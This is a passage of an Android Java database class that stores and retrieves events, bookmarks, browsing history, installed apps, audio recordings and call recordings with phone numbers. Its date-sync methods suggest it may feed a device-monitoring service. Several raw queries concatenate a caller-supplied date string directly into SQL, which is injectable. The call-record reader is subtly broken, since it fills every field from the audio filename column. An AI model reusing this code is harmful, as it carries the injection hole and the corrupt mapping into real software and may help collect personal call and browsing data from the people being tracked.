                SQLiteDatabase.releaseMemory();
            }
        }
        return eventList;
    }
    /**
     * Get EventInfo
     *
     * @param
     * @return
     */
    public EventModel getEventInfo(String eventid) {
        EventModel eventModel = null;
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            cursor = database.query(DBUtils.EVENT_TABLE, new String[]{"*"}, DBUtils.COLUMN_EVENT_ID + "=?", new String[]{eventid}, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                eventModel = new EventModel();
                eventModel.setEventid(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_ID)));
                eventModel.setTitle(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_TITLE)));
                eventModel.setDesc(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_DESC)));
                eventModel.setStartDate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_STARTDATE)));
                eventModel.setEndDate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_ENDDATE)));
                eventModel.setLocation(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_EVENT_LOCATION)));

            }
        } catch (Exception e) {
            e.printStackTrace();

        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return eventModel;

    }

//---------------------------------------EVENT END-------------------------------------------
    //---------------------------------------BOOKMARK START-------------------------------------------

    /**
     * Insert Bookmark
     *
     * @return
     */
    public long insertBookmark(BrowserModel browserModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_BOOKMARK_ID, browserModel.getBookmarkid());
            values.put(DBUtils.COLUMN_BOOKMARK_TITLE, browserModel.getTitle());
            values.put(DBUtils.COLUMN_BOOKMARK_URL, browserModel.getUrl());
            values.put(DBUtils.COLUMN_BOOKMARK_TYPE, browserModel.getType());
            values.put(DBUtils.COLUMN_BOOKMARK_DATETIME, browserModel.getDatetime());
            values.put(DBUtils.COLUMN_BOOKMARK_UPDATEDDATE, Utils.getCurrentTime());
            return database.insert(DBUtils.BOOKMARK_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    /**
     * get Maximum date of Bookmark
     *
     * @return
     */
    public String getMaxDateofBookmark() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_BOOKMARK_UPDATEDDATE + " from " + DBUtils.BOOKMARK_TABLE + " order by " + DBUtils.COLUMN_BOOKMARK_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_BOOKMARK_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    /**
     * Check if Bookmark is already exits
     *
     * @return
     */
    public boolean isBookmarkExits(String bokmarkId, String type) {

        boolean isavailable = false;
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {

            cursor = database.query(DBUtils.BOOKMARK_TABLE, new String[]{"*"}, DBUtils.COLUMN_BOOKMARK_ID + "=? and " + DBUtils.COLUMN_BOOKMARK_TYPE + "=?", new String[]{bokmarkId, type}, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                isavailable = true;
            } else {
                isavailable = false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return isavailable;
    }
    /**
     * get ALL BookmarkLsist
     *
     * @param
     * @return
     */
    public ArrayList<BrowserModel> getBookmarkList(String updateDate) {
        final ArrayList<BrowserModel> bookmarkList = new ArrayList<BrowserModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.BOOKMARK_TABLE + " where  Datetime(" + DBUtils.COLUMN_BOOKMARK_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                BrowserModel model = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    model = new BrowserModel();
                    model.setBookmarkid(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_BOOKMARK_ID)));
                    model.setTitle(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_BOOKMARK_TITLE)));
                    model.setUrl(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_BOOKMARK_URL)));
                    model.setType(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_BOOKMARK_TYPE)));
                    model.setDatetime(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_BOOKMARK_DATETIME)));
                    bookmarkList.add(model);
                    cursor.moveToNext();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return bookmarkList;
    }

//---------------------------------------BOOKMARK END-------------------------------------------
    //---------------------------------------HISTORY START-------------------------------------------

    /**
     * Insert History
     *
     * @return
     */
    public long insertHistory(BrowserModel browserModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_HISTORY_ID, browserModel.getBookmarkid());
            values.put(DBUtils.COLUMN_HISTORY_TITLE, browserModel.getTitle());
            values.put(DBUtils.COLUMN_HISTORY_URL, browserModel.getUrl());
            values.put(DBUtils.COLUMN_HISTORY_TYPE, browserModel.getType());
            values.put(DBUtils.COLUMN_HISTORY_DATETIME, browserModel.getDatetime());
            values.put(DBUtils.COLUMN_HISTORY_UPDATEDDATE, Utils.getCurrentTime());
            return database.insert(DBUtils.HISTORY_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    /**
     * Check if History is already exits
     *
     * @return
     */
    public boolean isHistoryExits(String historyId, String type) {

        boolean isavailable = false;
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {

            cursor = database.query(DBUtils.HISTORY_TABLE, new String[]{"*"}, DBUtils.COLUMN_HISTORY_ID + "=? and " + DBUtils.COLUMN_HISTORY_TYPE + "=?", new String[]{historyId, type}, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                isavailable = true;
            } else {
                isavailable = false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return isavailable;
    }
    /**
     * get Maximum date of History
     *
     * @return
     */
    public String getMaxDateofHistory() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_HISTORY_UPDATEDDATE + " from " + DBUtils.HISTORY_TABLE + " order by " + DBUtils.COLUMN_HISTORY_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_HISTORY_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    /**
     * get ALL HistoryList
     *
     * @param
     * @return
     */
    public ArrayList<BrowserModel> getHistoryList(String updateDate) {
        final ArrayList<BrowserModel> historyList = new ArrayList<BrowserModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.HISTORY_TABLE + " where  Datetime(" + DBUtils.COLUMN_HISTORY_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                BrowserModel model = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    model = new BrowserModel();
                    model.setBookmarkid(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_HISTORY_ID)));
                    model.setTitle(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_HISTORY_TITLE)));
                    model.setUrl(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_HISTORY_URL)));
                    model.setType(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_HISTORY_TYPE)));
                    model.setDatetime(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_HISTORY_DATETIME)));
                    historyList.add(model);
                    cursor.moveToNext();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return historyList;
    }
//---------------------------------------HISTORY END-------------------------------------------

    //---------------------------------------INSTALL APP START-------------------------------------------

    /**
     * Insert Install App
     *
     * @return
     */
    public long insertApp(InstallAppModel installAppModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_INSTALL_APP_NAME, installAppModel.getAppname());
            values.put(DBUtils.COLUMN_INSTALL_APP_PACKAGENAME, installAppModel.getPackageName());
            values.put(DBUtils.COLUMN_INSTALL_APP_VERSIONNAME, installAppModel.getVersionName());
            values.put(DBUtils.COLUMN_INSTALL_APP_VERSIONCODE, installAppModel.getVersioncode());
            values.put(DBUtils.COLUMN_INSTALL_APP_SOURCEDIR, installAppModel.getSourceDirectory());
            values.put(DBUtils.COLUMN_INSTALL_APP_UPDATEDDATE, Utils.getCurrentTime());
            return database.insert(DBUtils.INSTALL_APP_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    /**
     * Check if History is already exits
     *
     * @return
     */
    public boolean isAppExits(String packagename) {

        boolean isavailable = false;
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {

            cursor = database.query(DBUtils.INSTALL_APP_TABLE, new String[]{"*"}, DBUtils.COLUMN_INSTALL_APP_PACKAGENAME + "=?", new String[]{packagename}, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                isavailable = true;
            } else {
                isavailable = false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return isavailable;
    }
    /**
     * get Maximum date of Install Applist
     *
     * @return
     */
    public String getMaxDateofAppList() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_INSTALL_APP_UPDATEDDATE + " from " + DBUtils.INSTALL_APP_TABLE + " order by " + DBUtils.COLUMN_INSTALL_APP_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_INSTALL_APP_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    /**
     * get ALL HistoryList
     *
     * @param
     * @return
     */
    public ArrayList<InstallAppModel> getInstallAppList(String updateDate) {
        final ArrayList<InstallAppModel> installAppList = new ArrayList<InstallAppModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.INSTALL_APP_TABLE + " where  Datetime(" + DBUtils.COLUMN_INSTALL_APP_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                InstallAppModel model = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    model = new InstallAppModel();
                    model.setAppname(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_INSTALL_APP_NAME)));
                    model.setPackageName(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_INSTALL_APP_PACKAGENAME)));
                    model.setVersioncode(cursor.getInt(cursor.getColumnIndex(DBUtils.COLUMN_INSTALL_APP_VERSIONCODE)));
                    model.setVersionName(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_INSTALL_APP_VERSIONNAME)));
                    model.setSourceDirectory(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_INSTALL_APP_SOURCEDIR)));
                    installAppList.add(model);
                    cursor.moveToNext();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return installAppList;
    }
//---------------------------------------INSTALL APP END-------------------------------------------
    //---------------------------------------AUDIO START---------------------------------------------

    /**
     * Insert Audio Record
     *
     * @return
     */
    public long insertAudioRecord(AudioRecordModel audioRecordModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_AUDIO_RECORD_FILENAME, audioRecordModel.getFilename());
            values.put(DBUtils.COLUMN_AUDIO_RECORD_FILEPATH, audioRecordModel.getFilepath());
            values.put(DBUtils.COLUMN_AUDIO_RECORD_DATE, audioRecordModel.getRecordDate());
            values.put(DBUtils.COLUMN_AUDIO_RECORD_UPDATEDDATE, Utils.getCurrentTime());
            return database.insert(DBUtils.AUDIORECORD_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }
    /**
     * get Maximum date of History
     *
     * @return
     */
    public String getMaxDateofAudioRecord() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_AUDIO_RECORD_UPDATEDDATE + " from " + DBUtils.AUDIORECORD_TABLE + " order by " + DBUtils.COLUMN_AUDIO_RECORD_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    /**
     * get ALL AudioList
     *
     * @param
     * @return
     */
    public ArrayList<AudioRecordModel> getAudioRecordList(String updateDate) {
        final ArrayList<AudioRecordModel> audioList = new ArrayList<AudioRecordModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.AUDIORECORD_TABLE + " where  Datetime(" + DBUtils.COLUMN_AUDIO_RECORD_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                AudioRecordModel audioRecordModel = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    audioRecordModel = new AudioRecordModel();
                    audioRecordModel.setFilename(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_FILENAME)));
                    audioRecordModel.setFilepath(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_FILEPATH)));
                    audioRecordModel.setRecordDate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_DATE)));
                    audioList.add(audioRecordModel);
                    cursor.moveToNext();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return audioList;
    }
//---------------------------------------AUDIO END----------------------------------------------

    //---------------------------------------CALL RECORD STRAT---------------------------------------

    /**
     * Insert Call Record
     *
     * @return
     */
    public long insertCallRecord(CallRecordModel callRecordModel) {
        if (!database.isOpen()) {
            openDataBase();
        }
        try {
            ContentValues values = new ContentValues();
            values.put(DBUtils.COLUMN_CALL_RECORD_INCOMING, callRecordModel.getIncomingnumber());
            values.put(DBUtils.COLUMN_CALL_RECORD_OUTGOING, callRecordModel.getOutgoingnumber());
            values.put(DBUtils.COLUMN_CALL_RECORD_DATE, callRecordModel.getRecorddate());
            values.put(DBUtils.COLUMN_CALL_RECORD_FILENAME, callRecordModel.getFilename());
            values.put(DBUtils.COLUMN_CALL_RECORD_FILEPATH, callRecordModel.getFilepath());
            values.put(DBUtils.COLUMN_CALL_RECORD_UPDATEDDATE, Utils.getCurrentTime());



            return database.insert(DBUtils.CALL_RECORD_TABLE, null, values);

        } catch (Exception e) {
            e.printStackTrace();
            return -1;

        } finally {
            close();
            SQLiteDatabase.releaseMemory();
        }
    }




    /**
     * get Maximum date of History
     *
     * @return
     */
    public String getMaxDateofcallRecord() {
        String maxdate = "";
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "select " + DBUtils.COLUMN_CALL_RECORD_UPDATEDDATE + " from " + DBUtils.CALL_RECORD_TABLE + " order by " + DBUtils.COLUMN_CALL_RECORD_UPDATEDDATE + " desc limit 1";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                maxdate = cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_CALL_RECORD_UPDATEDDATE));

            }
        } catch (Exception e) {
            e.printStackTrace();
            maxdate = "";
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return maxdate;

    }
    /**
     * get ALL AudioList
     *
     * @param
     * @return
     */
    public ArrayList<CallRecordModel> getcallRecordList(String updateDate) {
        final ArrayList<CallRecordModel> recordList = new ArrayList<CallRecordModel>();
        if (!database.isOpen()) {
            openDataBase();
        }
        Cursor cursor = null;
        try {
            String query = "Select * from " + DBUtils.CALL_RECORD_TABLE + " where  Datetime(" + DBUtils.COLUMN_CALL_RECORD_UPDATEDDATE + ")>Datetime('" + updateDate + "')";
            cursor = database.rawQuery(query, null);
            if (cursor != null && cursor.getCount() > 0) {
                cursor.moveToFirst();
                CallRecordModel callRecordModel = null;
                for (int i = 0; i < cursor.getCount(); i++) {
                    callRecordModel = new CallRecordModel();
                    callRecordModel.setRecordId(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_FILENAME)));
                    callRecordModel.setIncomingnumber(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_FILENAME)));
                    callRecordModel.setOutgoingnumber(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_FILENAME)));
                    callRecordModel.setFilename(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_FILENAME)));
                    callRecordModel.setFilepath(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_FILENAME)));
                    callRecordModel.setRecorddate(cursor.getString(cursor.getColumnIndex(DBUtils.COLUMN_AUDIO_RECORD_FILENAME)));

                    recordList.add(callRecordModel);
                    cursor.moveToNext();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

            close();
            if (cursor != null) {
                cursor.close();
                SQLiteDatabase.releaseMemory();
            }
        }
        return recordList;
    }
    //---------------------------------------CALL RECORD END-----------------------------------------
}